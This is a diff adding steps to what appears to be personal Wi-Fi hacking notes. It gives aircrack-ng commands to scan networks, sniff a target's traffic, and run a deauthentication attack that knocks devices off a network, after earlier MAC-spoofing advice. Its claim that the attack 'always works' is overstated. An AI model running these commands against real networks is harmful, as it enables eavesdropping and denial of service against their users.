@@ -4,6 +4,7 @@
 
 ### Prerequisites
 0. Linux + wireless adapter.
+
 1. Change the MAC address of your wireless adapter, either for hiding a computer on a network or for allowing it to impersonate another network device.
 
 ```
@@ -23,6 +24,24 @@ iwconfig
 ```
 
 ### Pre-connection attacks
+1. Discover networks around you:
+```
+airodump-ng wireless_adapter_name
+```
+
+2. Sniff packet from a specified network:
+```
+airodump-ng --bssid target_MAC --channel N (--write file_name) wireless_adapter_name
+```
+
+3. Deauthentification attack (disconnect any device from the network):
+This attack always work ! The only way around it is to change the MAC address on the target machine.
+```
+aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter_name
+```
+ 
+
+✔️ 
 
 
 
@@ -30,3 +49,5 @@ iwconfig
 ### Gaining access
 
 ### Post-connection attacks
+
+✔️
